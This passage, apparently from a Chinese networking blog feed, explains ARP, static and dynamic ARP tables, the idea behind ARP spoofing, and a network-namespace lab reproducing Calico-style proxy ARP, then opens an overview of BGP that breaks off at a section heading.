<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\C</span>M&gt;arp -a
</span></span><span class="line"><span class="cl">接口: 192.168.1.103 --- 0x3
</span></span><span class="line"><span class="cl">  Internet 地址         	物理地址              	类型
</span></span><span class="line"><span class="cl">  192.168.1.1           	3c-46-d8-5d-53-87     	动态
</span></span><span class="line"><span class="cl">  192.168.1.255         	ff-ff-ff-ff-ff-ff    	静态
</span></span><span class="line"><span class="cl">  224.0.0.22            	01-00-5e-00-00-16     	静态
</span></span><span class="line"><span class="cl">  224.0.0.251           	01-00-5e-00-00-fb    	静态
</span></span><span class="line"><span class="cl">  224.0.0.252           	01-00-5e-00-00-fc     	静态
</span></span><span class="line"><span class="cl">  239.11.20.1           	01-00-5e-0b-14-01     	静态
</span></span><span class="line"><span class="cl">  239.255.255.250       	01-00-5e-7f-ff-fa     	静态
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="arp常用命令">arp常用命令</h3>
<p><code>arp -a</code> 查看所有记录</p>
<p><code>arp -d</code> 清除arp表</p>
<p><code>arp -s $ip $mac</code>   将绑定IP和MAC</p>
<p><code>arp -n</code> 不解析名称打印arp表</p>
<h3 id="arp缓存是把双刃剑">ARP缓存是把双刃剑</h3>
<p>主机有了arp缓存表，可以加快arp的解析速度，减少局域网内广播风暴。</p>
<p>正是有了arp缓存表，给恶意黑客带来了攻击服务器主机的风险，这个就是arp欺骗攻击</p>
<p>切换路由器，负载均衡器等设备时，可能会导致短时网络中断（发送广播）。</p>
<h3 id="为什么要使用arp协议">为什么要使用ARP协议</h3>
<p>OSI模型把网络工作分为七层，彼此不直接打交道，只通过接口(layer interface)。IP地址工作在第三层，MAC地址工作在第二层。在局域网中，当主机或其它三层网络设备有数据要发送给另一台主机或三层网络设备时，它需要知道对方的网络层地址（即IP地址）。但是仅有IP地址是不够的，因为IP报文必须封装成帧才能通过物理网络发送，因此发送方还需要知道接收方的物理地址（即MAC地址），但又不能跨第二、三层，所以需要用ARP协议服务，来帮助获取到目的节点的MAC地址。ARP可以实现将IP地址解析为MAC地址。主机或三层网络设备上会维护一张ARP表，用于存储IP地址和MAC地址的关系。一般ARP表项包括动态ARP表项和静态ARP表项。</p>
<h2 id="模拟一个环境抓包分析arp数据包的内容">模拟一个环境抓包分析arp数据包的内容</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Huawei]         系统视图
</span></span><span class="line"><span class="cl">&lt;Huawei&gt;         用户视图，开机命令行进入的就是用户视图
</span></span><span class="line"><span class="cl">system-view      用户视图切换系统视图
</span></span><span class="line"><span class="cl">interface g0/0/0 选择接口
</span></span><span class="line"><span class="cl">display arp all  查看arp表
</span></span><span class="line"><span class="cl">arp-porxy enable 开启代理ARP功能
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;Huawei&gt;dis this 
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 设置g0/0/0接口ip</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Huawei-GigabitEthernet0/0/0<span class="o">]</span>ip a 192.168.0.1 <span class="m">24</span>
</span></span><span class="line"><span class="cl">Jan <span class="m">19</span> <span class="m">2021</span> 17:56:33-08:00 Huawei %%01IFNET/4/LINK_STATE<span class="o">(</span>l<span class="o">)[</span>0<span class="o">]</span>:The line protocol
</span></span><span class="line"><span class="cl"> IP on the interface GigabitEthernet0/0/0 has entered the UP state. 
</span></span><span class="line"><span class="cl"><span class="o">[</span>Huawei-GigabitEthernet0/0/0<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Huawei-GigabitEthernet0/0/0<span class="o">]</span>dis this
</span></span><span class="line"><span class="cl"><span class="o">[</span>V200R003C00<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/0
</span></span><span class="line"><span class="cl"> ip address 192.168.0.1 255.255.255.0 
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 设置g0/0/1 ip</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Huawei-GigabitEthernet0/0/0<span class="o">]</span>int g0/0/1
</span></span><span class="line"><span class="cl"><span class="o">[</span>Huawei-GigabitEthernet0/0/1<span class="o">]</span>ip a 192.168.1.1 <span class="m">24</span>
</span></span><span class="line"><span class="cl">Jan <span class="m">19</span> <span class="m">2021</span> 17:57:02-08:00 Huawei %%01IFNET/4/LINK_STATE<span class="o">(</span>l<span class="o">)[</span>1<span class="o">]</span>:The line protocol
</span></span><span class="line"><span class="cl"> IP on the interface GigabitEthernet0/0/1 has entered the UP state. 
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时查看pc与路由器的arp表</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ arp -a
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Internet Address    Physical Address    Type
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>ping另外一台设备 192.168.2.2</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ping 192.168.1.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Ping 192.168.1.2: 32 data bytes, Press Ctrl_C to break
</span></span><span class="line"><span class="cl">Request timeout!
</span></span><span class="line"><span class="cl">From 192.168.1.2: bytes=32 seq=2 ttl=127 time=15 ms
</span></span><span class="line"><span class="cl">From 192.168.1.2: bytes=32 seq=3 ttl=127 time=16 ms
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--- 192.168.1.2 ping statistics ---
</span></span><span class="line"><span class="cl">  3 packet(s) transmitted
</span></span><span class="line"><span class="cl">  2 packet(s) received
</span></span><span class="line"><span class="cl">  33.33% packet loss
</span></span><span class="line"><span class="cl">  round-trip min/avg/max = 0/15/16 ms
</span></span></code></pre></td></tr></table>
</div>
</div><p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210119185418021.png" alt="image-20210119185418021"  /></p>
<p>另外一段抓包可以看到对应收到的广播</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210119185433046.png" alt="image-20210119185433046"  /></p>
<p>以太网arp数据包段说明</p>
<table>
<thead>
<tr>
<th>目的mac地址</th>
<th>源mac地址</th>
<th>帧类型</th>
<th>硬件类型</th>
<th>上层协议类型</th>
<th>mac地址长度</th>
<th>ip地址长度</th>
<th>操作类型</th>
<th>源mac地址</th>
<th>源ip地址</th>
<th>目的mac地址</th>
<th>目的ip地址</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>HuaweiTe_c7:73:db (54:89:98:c7:73:db)</td>
<td>HuaweiTe_58:37:e8 (00:e0:fc:58:37:e8)</td>
<td>ARP</td>
<td>Ethernet</td>
<td>IPv4</td>
<td>6</td>
<td>4</td>
<td>2</td>
<td>HuaweiTe_58:37:e8 (00:e0:fc:58:37:e8)</td>
<td>192.168.0.1</td>
<td>HuaweiTe_c7:73:db (54:89:98:c7:73:db)</td>
<td>192.168.0.2</td>
</tr>
</tbody>
</table>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210119191143883.png" alt="image-20210119191143883"  /></p>
<p>arp广播是通过网关进行传递的，本机arp表缓存的为网关的mac地址</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210119191157808.png" alt="image-20210119191157808"  /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ arp -a
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Internet Address    Physical Address    Type
</span></span><span class="line"><span class="cl">192.168.1.1         00-E0-FC-58-37-E9   dynamic
</span></span></code></pre></td></tr></table>
</div>
</div><p>op操作类型说明</p>
<table>
<thead>
<tr>
<th>代码</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>arp请求</td>
</tr>
<tr>
<td>2</td>
<td>arp应答</td>
</tr>
<tr>
<td>3</td>
<td>rarp请求</td>
</tr>
<tr>
<td>4</td>
<td>rarp应答</td>
</tr>
</tbody>
</table>
<h3 id="动态arp表项">动态ARP表项</h3>
<p>动态ARP表项由ARP协议通过ARP报文自动生成和维护，可以被老化，可以被新的ARP报文更新，也可以被静态ARP表项所覆盖。当到达老化时间或接口关闭时会删除相应的动态ARP表项。</p>
<h3 id="静态arp表项">静态ARP表项</h3>
<p>静态ARP表项通过手工配置（通过对应设备的IP地址与MAC地址绑定命定进行）和维护。不会被老化，也不会被动态ARP表项覆盖。配置静态ARP表项可以增加通信的安全性，因为静态ARP可以限定和指定IP地址的设备通信时只使用指定的MAC地址（也就是我们通常所说的IP地址和MAC地址的绑定），此时攻击报文无法修改此表项的IP地址和MAC地址的映射关系，从而保护了本设备和指定设备间正常通信。静态ARP表项又分为短静态ARP表项和长静态ARP表项</p>
<h3 id="短静态arp表项">短静态ARP表项</h3>
<p>在配置短静态ARP表项时，只需要配置IP地址和MAC地址项。如果出接口是三层以太网接口，短静态ARP表项可以直接用于报文转发；如果出接口是VLAN虚接口，短静态ARP表项不能直接用于报文转发，当要发送IP数据包时，先发送ARP请求报文，如果收到的相应报文中的源IP地址和源MAC地址与所配置的IP地址和MAC地址相同，则将接受ARP响应报文的接口加入该静态表项中，之后就可以用于IP数据包的转发了。</p>
<h3 id="长静态arp表项">长静态ARP表项</h3>
<p>在配置长静态ARP表项时，除了配置IP地址和MAC地址项外，还必须配置该ARP表所对应的VLAN（虚拟局域网）和出接口。也就是长静态ARP表项同事绑定了IP地址、MAC地址、VLAN和端口，可以直接用于报文转发。</p>
<h3 id="apr欺骗">apr欺骗</h3>
<p>ARP病毒，ARP欺骗</p>
<p>高可用服务器对之间切换时要考虑ARP缓存问题</p>
<p>路由器等设备无缝迁移时要考虑ARP缓存的问题，例如：更换办公室的路由器.</p>
<h3 id="arp欺骗原理">ARP欺骗原理</h3>
<p>ARP攻击就是通过伪造IP地址和MAC地址对实现ARP欺骗的，如果一台主机中了ARP病毒，那么它就能够在网络中产生大量的ARP通信量（它会以很快的频率进行广播），以至于使网络阻塞，攻击者只要持续不断的发出伪造ARP响应包就能更改局域网中目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p>
<p>ARP攻击主要是存在于局域网网络中，局域网中若有一个人感染ARP木马，则感染该ARP木马的系统将会试图通过“ARP欺骗”手段截获所在网络内其他计算机的通信故障。</p>
<p>服务器切换ARP问题</p>
<p>当网络中一台提供服务的机器宕机后，当在其他运行正常的机器添加宕机的机器的IP时，会因为客户端的ARP table cache的地址解析还是宕机的机器的MAC地址。从而导致，即使在其他运行正常的机器添加宕机的机器的IP，也会发生客户依然无法访问的情况。</p>
<p>解决方法是：当宕机时，IP地址迁移到其他机器上时，需要通过arping命令来通知所有网络内机器清除其本地的ARP table cache，从而使得客户机访问时重新广播获取MAC地址.</p>
<p>几乎所有的高可用软件都会考虑这个问题。</p>
<p>ARP广播而进行新的地址解析。</p>
<p>linux下具体命令：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">arping -I eth0 -c 3 -s 10.0.0.162 10.0.0.253
</span></span><span class="line"><span class="cl">arping -U -I eth0 10.0.0.162
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="proxy-arp">proxy arp</h2>
<p>代理ARP的原理就是当出现跨网段的ARP请求时，路由器将自己的MAC返回给发送ARP广播请求发送者，实现MAC地址代理（善意的欺骗），最终使得主机能够通信。</p>
<p>如一个网络中设备D1 (<code>192.168.0.2/24</code>) 与设备D2 (<code>192.168.1.2/24</code>)，D1和D2在相互通信时，D1先发送了ARP广播，请求D2的mac地址，但是由于两个设备处于不同网，也就是说D1的ARP请求会被R1拦截到，然后R1会封装自己的mac地址为目的地址发送一个ARP回应数据报给R1（善意的欺骗），然后R1就会代替D1去访问D2。</p>
<p>如上述arp抓包图，首先广播收到回复为R1<code>192.168.0.1</code></p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210119192807856.png" alt="image-20210119192807856"  /></p>
<p>如果R1关闭了arp的代理功能，那么R1再访问R3的时候，R2并不会把自己的mac地址给R1，那么R1和R3之间就无法通信。默认情况下，思科的设备是开启了arp代理功能，也就是说，R2会作为中间代理实现R1和R3之间跨网段通信。</p>
<h3 id="实验通过命名空间模拟容器网络的代理arp数据包">实验：通过命名空间模拟容器网络的代理arp数据包</h3>
<p>实验前所需掌握的知识<strong>接口作用域 interface scope</strong>与<strong>链路本地地址（Link-local address)</strong></p>
<h4 id="接口作用域">接口作用域</h4>
<p>路由的接口作用域，这个配置可以解释为路由的范围会影响源数据（源地址）请求的选择。当主机存在多个网络接口和地址时，route scope控制ip数据寻址和广播的范围。</p>
<ul>
<li>
<p>global：如果来自不同的端口（可以理解为网卡等）可以转发。</p>
</li>
<li>
<p>link：仅在此设备有效，即只有来自这个网络接口设备的流量才走这条路由（发送和接收为同一端口）</p>
</li>
<li>
<p>host：本地回环，仅用于在主机内部进行通信。</p>
</li>
<li>
<p>site：ipv6独有。</p>
<p>reference <a href="http://linux-ip.net/html/tools-ip-address.html">http://linux-ip.net/html/tools-ip-address.html</a></p>
</li>
</ul>
<h4 id="链路本地地址">链路本地地址</h4>
<p><code>169.254.0.0/16</code> 保留地址块，在<code>169.254.1.0</code> ~ <code>169.254.254.255</code> 中随机选择一个地址进行ARP广播，如果收到回复，表示IP地址已经使用。</p>
<p>在Kubernetes Calico网络中，当一个数据包的目的地址不是本网络时，会先发起ARP广播，网关设置即<code>169.254.1.1</code>收到会将自己的mac地址返回给发送端，后续的请求由这个veth对进行完成，使用代理arp做了arp欺骗。这样做抑制了arp广播攻击，并且通过代理arp也可以进行跨网络的访问。</p>
<p><strong>实验目的</strong>：模拟calico网络，使用代理arp欺骗完成网络的跨网段通信</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210120214626798.png" alt="image-20210120214626798"  /></p>
<p>在准备的两个主机进行相应的设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 添加网络名称空间</span>
</span></span><span class="line"><span class="cl">ip netns add net1
</span></span><span class="line"><span class="cl"><span class="c1"># 创建一个虚拟以太网对</span>
</span></span><span class="line"><span class="cl">ip link add veth1 <span class="nb">type</span> veth peer name eth1
</span></span><span class="line"><span class="cl"><span class="c1"># 将一端关联至网络名称空间内</span>
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> eth1 netns net1
</span></span><span class="line"><span class="cl"><span class="c1"># 设置一个IP地址</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip addr add 192.168.1.10/24 dev eth1
</span></span><span class="line"><span class="cl"><span class="c1"># 启动这个网卡</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip link <span class="nb">set</span> eth1 up
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 添加一个自动寻址IP，作为网关</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip route add 169.254.1.1 dev eth1 scope link
</span></span><span class="line"><span class="cl"><span class="c1"># 所有的流量都通过这个网关进行进出</span>
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip route add default via 169.254.1.1 dev eth1
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip route 
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip link <span class="nb">set</span> eth1 up
</span></span><span class="line"><span class="cl"><span class="c1"># 设置主机端的网络对</span>
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> veth1 up
</span></span><span class="line"><span class="cl"><span class="c1"># 所有通过192.168.1.10的数据包进出都走veth1</span>
</span></span><span class="line"><span class="cl">ip route add 192.168.1.10 dev veth1 scope link
</span></span><span class="line"><span class="cl"><span class="c1"># 通往192.168.2.10的数据的下一挑是10.0.0.3（对端主机IP）</span>
</span></span><span class="line"><span class="cl">ip route add 192.168.2.10 via 10.0.0.3 dev eth0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 设置另外一台设备</span>
</span></span><span class="line"><span class="cl">ip netns add net1
</span></span><span class="line"><span class="cl">ip link add veth1 <span class="nb">type</span> veth peer name eth1
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> eth1 netns net1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip addr add 192.168.2.10/24 dev eth1
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip link <span class="nb">set</span> eth1 up
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip route add 169.254.1.1 dev eth1 scope link
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip route add default via 169.254.1.1 dev eth1
</span></span><span class="line"><span class="cl">ip netns <span class="nb">exec</span> net1 ip route 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ip link <span class="nb">set</span> veth1 up
</span></span><span class="line"><span class="cl">ip route add 192.168.2.10 dev veth1 scope link
</span></span><span class="line"><span class="cl">ip route add 192.168.1.10 via 10.0.0.4 dev eth0
</span></span></code></pre></td></tr></table>
</div>
</div><p>开启对应内核设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 代理arp</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/conf/veth1/proxy_arp
</span></span><span class="line"><span class="cl"><span class="c1"># 专用VLAN代理arp。基本上允许代理arp回复到同一接口</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/conf/veth1/proxy_arp_pvlan
</span></span><span class="line"><span class="cl"><span class="c1"># 内核转发</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
</span></span></code></pre></td></tr></table>
</div>
</div><p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210120215702370.png" alt="image-20210120215702370"  /></p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210120215729933.png" alt="image-20210120215729933"  /></p>
<p>reference</p>
<p><a href="http://linux-ip.net/html/ether-arp-proxy.html">linux proxy arp</a></p>
<p><a href="https://nova.moe/note-on-169-254-ip-addresses/">169.254-ip-address</a></p>
<p>​</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>动态路由- BGP</title>
      <link>https://www.oomkill.com/2021/01/dynamic-routing-bgp/</link>
      <pubDate>Wed, 20 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/dynamic-routing-bgp/</guid>
      <description></description>
      <content:encoded><![CDATA[<h3 id="概述">概述</h3>
<p>BGP <code>Border Gateway Protocol</code> 边界网关协议,，是一种运行于TCP上的自治系统AS（Autonomous System）之间的路由可达，并选择最佳路由的距离矢量路由协议。</p>
<p>早期发布的三个版本分别是BGP-1、BGP-2和BGP-3，1994年开始使用BGP-4，2006年之后单播IPv4网络使用的版本是BGP-4，其他网络（如IPv6等）使用的版本是MP-BGP。</p>
<p>MP-BGP是对BGP-4进行了扩展，来达到在不同网络中应用的目的，BGP-4原有的消息机制和路由机制并没有改变。MP-BGP在IPv6单播网络上的应用称为BGP4+，在IPv4组播网络上的应用称为MBGP（Multicast BGP）。</p>
<h3 id="历史">历史</h3>
<p>为方便管理规模不断扩大的网络，网络被分成了不同的自治系统。1982年，外部网关协议EGP（Exterior Gateway Protocol）被用于实现在AS之间动态交换路由信息。但是EGP设计得比较简单，只发布网络可达的路由信息，而不对路由信息进行优选，同时也没有考虑环路避免等问题，很快就无法满足网络管理的要求。</p>
<p>BGP是为取代最初的EGP而设计的另一种外部网关协议。不同于最初的EGP，BGP能够进行路由优选、避免路由环路、更高效率的传递路由和维护大量的路由信息。</p>
<p>虽然BGP用在AS之间传递路由信息，但并非所有AS之间传递路由信息都要运行BGP。如数据中心上行到Internet的出口上，为了避免Internet海量路由对数据中心内部网络影响，设备采用静态路由代替BGP与外部网络通信。</p>
<p>受益</p>
<p>BGP从多方面保证了网络的安全性、灵活性、稳定性、可靠性和高效性：</p>
<p>BGP采用认证和GTSM的方式，保证了网络的安全性。</p>
<p>BGP提供了丰富的路由策略，能够灵活的进行路由选路，并且能指导邻居按策略发布路由。</p>
<p>BGP提供了路由聚合和路由衰减功能用于防止路由振荡，有效提高了网络的稳定性。</p>
<p>BGP使用TCP作为其传输层协议（端口号为179），并支持BGP与BFD联动、BGP Tracking和BGP GR和NSR，提高了网络的可靠性。</p>
<p>在邻居数目多、路由量大且大多邻居有相同出口策略场景下，BGP用按组打包技术极大提高了BGP打包发包性能。</p>
<h2 id="bgp相关名词说明">BGP相关名词说明</h2>
<table>
<thead>
<tr>
<th>名词</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>BGP</td>
<td>边界网关协议（Border Gateway Protocol）是互联网上一个核心的去中心化自治路由协议，它通过维护IP路由表或前缀表来实现自治系统（AS）之间的可达性<br/>大多数ISP使用BGP来与其他ISP创建路由连接，特大型的私有IP网络也可以使用BGP<br/>BGP的通信对端（对等实体，Peer）通过TCP（端口179）会话交换数据，BGP路由器会周期地发送19字节的保活消息来维护连接。在路由协议中，只有BGP使用TCP作为传输层协议</td>
</tr>
<tr>
<td>IBGP</td>
<td>内部边界网关协议。同一个AS内部的两个或多个对等实体之间运行的BGP被称为IBGP</td>
</tr>
<tr>
<td>IGP</td>
<td>内部网关协议。同一AS内部的对等实体（路由器）之间使用的协议，它存在可扩容性问题：<br/>1. 一个IGP内部应该仅有数十（最多小几百）个对等实体<br/>2. 对于端点数，也存在限制，一般在数百（最多上千）个Endpoint级别<br/>IBGP和IGP都是处理AS内部路由的，仍然需要IGP的原因是：<br/>1. IBGP之间是TCP连接，也就意味着IBGP邻居采用的是逻辑连接的方式，两个IBGP连接不一定存在实际的物理链路。所以需要有IGP来提供路由，以完成BGP路由的递归查找<br/>2. BGP协议本身实际上并不发现路由，BGP将路由发现的工作全部移交给了IGP协议，它本身着重于路由的控制</td>
</tr>
<tr>
<td>EBGP</td>
<td>外部边界网关协议。归属不同的AS的对等实体之间运行的BGP称为EBGP</td>
</tr>
<tr>
<td>AS</td>
<td>自治系统（Autonomous system），一个组织（例如ISP）管辖下的所有IP网络和路由器的整体<br/><br/>参与BGP路由的每个AS都被分配一个唯一的自治系统编号（ASN）。对BGP来说ASN是区别整个相互连接的网络中的各个网络的唯一标识。64512到65535之间的ASN编号保留给专用网络使用</td>
</tr>
<tr>
<td>Route<br/>Reflector</td>
<td>同一AS内如果有多个路由器参与BGP路由，则它们之间必须配置成全连通的网状结构——任意两个路由器之间都必须配置成对等实体。由于所需要TCP连接数是路由器数量的平方，这就导致了巨大的TCP连接数<br/><br/>为了缓解这种问题，BGP支持两种方案：Route Reflector、Confederations<br/><br/>路由反射器（Route Reflector）是AS内的一台路由器，其它所有路由器都和RR直接连接，作为RR的客户机。RR和客户机之间建立BGP连接，而客户机之间则<br/>不需要相互通信<br/><br/>RR的工作步骤如下：<br/>1. 从非客户机IBGP对等实体学到的路由，发布给此RR的所有客户机<br/>2. 从客户机学到的路由，发布给此RR的所有非客户机和客户机<br/>3. 从EBGP对等实体学到的路由，发布给所有的非客户机和客户机<br/>RR的一个优势是配置方便，因为只需要在反射器上配置</td>
</tr>
<tr>
<td>工作负载</td>
<td>Workload，即运行在Calico节点上的虚机或容器</td>
</tr>
<tr>
<td>全互联</td>
<td>全互联网络（Full node-to-node Mesh）是指任何两个Calico节点都进行配对的L3连接模式</td>
</tr>
</tbody>
</table>
<h3 id="bgp-应用">BGP 应用</h3>
<p>国内IDC机房需要在 <code>CNNIC</code> (中国互联网信息中心)或 <code>APNIC</code> (亚太网络信息中心)申请自己的IP地址段和AS号，然后将自己的IP地址广播到其它网络运营商的AS中，并<strong>通过BGP协议将多个AS进行连接，从而实现可自动跨网访问</strong>。此时，当用户发出访问请求后，将根据BGP协议的机制自动在已建立连接的多个AS之间为用户提供最佳路由，从而实现不同网络运营商用户的高速访问同一机房资源。</p>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20221025173224813.png" alt="image-20221025173224813"  /></p>
<h3 id="bgp的运行">BGP的运行</h3>
